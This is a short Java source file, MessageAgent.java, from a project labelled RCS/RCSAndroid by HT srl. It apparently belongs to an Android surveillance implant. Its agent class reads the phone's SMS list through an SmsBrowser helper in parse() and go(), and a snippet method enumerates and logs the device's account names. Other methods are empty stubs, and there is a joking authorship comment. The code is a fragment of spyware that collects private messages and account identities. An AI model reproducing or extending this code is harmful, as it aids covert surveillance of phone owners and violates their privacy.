/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : MessageAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.agent;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.util.Log;

import com.ht.RCSAndroidGUI.Status;

// TODO: Auto-generated Javadoc
/**
 * The Class MessageAgent.
 *
 * @author zeno -> Ahahah ti piacerebbe eh?? :>
 * @real-author Que
 */
public class AgentMessage extends AgentBase {

	/** The TAG. */
	private final String TAG = "AgentMessage";

	@Override
	public void begin() {
		// TODO Auto-generated method stub
	}

	@Override
	public void end() {
		// TODO Auto-generated method stub
	}

	@Override
	public boolean parse(AgentConf conf) {
	SmsBrowser browser = new SmsBrowser();
		
		browser.getSmsList();
		return true;
	}

	@Override
	public void go() {
		SmsBrowser browser = new SmsBrowser();
		
		browser.getSmsList();
	}

	// SNIPPET
	/**
	 * Check email accounts.
	 */
	private void checkEmailAccounts() {
		final Account[] accounts = AccountManager.get(Status.getAppContext())
				.getAccounts();
		for (final Account account : accounts) {

			final String name = account.name;
			Log.d("QZ", TAG + name);
		}
	}

}
